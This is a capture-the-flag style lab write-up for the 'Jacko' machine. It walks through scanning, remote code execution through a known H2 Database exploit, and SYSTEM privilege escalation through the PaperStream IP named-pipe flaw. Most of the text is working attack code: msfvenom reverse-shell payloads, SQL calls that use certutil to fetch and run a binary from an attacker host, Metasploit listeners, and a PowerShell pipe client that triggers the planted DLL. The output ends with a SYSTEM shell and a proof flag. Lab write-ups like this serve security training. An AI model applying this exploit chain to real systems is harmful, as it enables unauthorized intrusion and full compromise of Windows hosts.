# Jacko

## Enumeration & scanning

- Open ports are 80 & 8082; H2 Database Engine.
- App is known to be [vulnerable](https://www.exploit-db.com/exploits/49384), easy to validate.

``` sh
# Default scanning
sudo nmap -p- 192.168.163.66
enum4linux -a 192.168.163.66  
nuclei -target http://192.168.163.66  
```

## Exploitation

- Follow exploit for H2 DB to get RCE.
- Get command execution, figure out how to get reverse shell. Opted for x86 version after failures. Followed this [resource](https://github.com/frizb/MSF-Venom-Cheatsheet).
- Drop shell binary and execute.

``` sh
# H2 DB exploitation
# Prepare shell
msfvenom -p windows/shell_reverse_tcp LHOST=192.168.45.152 LPORT=4444 -f exe > shell.exe  
# Start listener
msfconsole -x "use exploit/multi/handler;set payload windows/shell_reverse_tcp;set LHOST 192.168.45.152;set LPORT 4444;run;" 
# Follow exploit preparation steps
# Drop shell
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["certutil.exe", "-urlcache","-split", "-f", "http://192.168.45.152/shell.exe",".\\\\..\\\\..\\\\..\\\\JavaTemp\\\\shell.exe"]).getInputStream()).useDelimiter("\\Z").next()');
# Execute shell and get reverse shell
CALL JNIScriptEngine_eval('new java.util.Scanner(java.lang.Runtime.getRuntime().exec(["cmd.exe", "/c", "..\\..\\..\\..\\JavaTemp\\shell.exe"]).getInputStream()).useDelimiter("\\Z").next()');

# Upgrade shell to PowerShell and get flag
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe
# Fix missing PATH entries
$env:PATH
$Env:Path += ";C:\WINDOWS\system32"
```

## Privilege Escalation

- Look at services and apps available. Find PaperStream IP which has known [vulnerability](https://www.exploit-db.com/exploits/49382).
- Validate version, it is vulnerable.
- Prepare shell and get it on device for execution and exploitation.

``` sh
# Get available apps
Get-ItemProperty "HKLM:\SOFTWARE\Wow6432Node\Microsoft\Windows\CurrentVersion\Uninstall\*" | select displayname
# Check processes
Get-Process
# Check named pipes needed for exploit
[System.IO.Directory]::GetFiles("\\.\\pipe\\")
# Check app version for exploit
type C:\Windows\twain_32\Fjicube\ProductInfo.ini

# Prepare shell
msfvenom -p windows/shell_reverse_tcp -f dll -o shell.dll LHOST=192.168.45.152 LPORT=5555
# Download shell
certutil.exe -urlcache -split -f http://192.168.45.152/shell.dll .\shell.dll
# Start listener
msfconsole -x "use exploit/multi/handler;set payload windows/shell_reverse_tcp;set LHOST 192.168.45.152;set LPORT 5555;run;" 
# Set correct filename
mv shell.dll UninOldIS.dll

# Execute exploit
$client = New-Object System.IO.Pipes.NamedPipeClientStream(".", "FjtwMkic_Fjicube_32", [System.IO.Pipes.PipeDirection]::InOut, [System.IO.Pipes.PipeOptions]::None, [System.Security.Principal.TokenImpersonationLevel]::Impersonation)
$reader = $null
$writer = $null
try {
    $client.Connect()
    $reader = New-Object System.IO.StreamReader($client)
    $writer = New-Object System.IO.StreamWriter($client)
    $writer.AutoFlush = $true
    $writer.Write("ChangeUninstallString")
    $reader.ReadLine()	
} finally {
    $client.Dispose()
}

# Get shell and flag
C:\Windows\system32>whoami
whoami
nt authority\system

C:\Users\Administrator\Desktop>type proof.txt
type proof.txt
4c4695fc993e56743c5848162a8bf77a
```

## References

- https://www.exploit-db.com/exploits/49384
- https://github.com/frizb/MSF-Venom-Cheatsheet

## Rabbit holes

- Reverse shell was tricky to get working due to errors and little feedback.
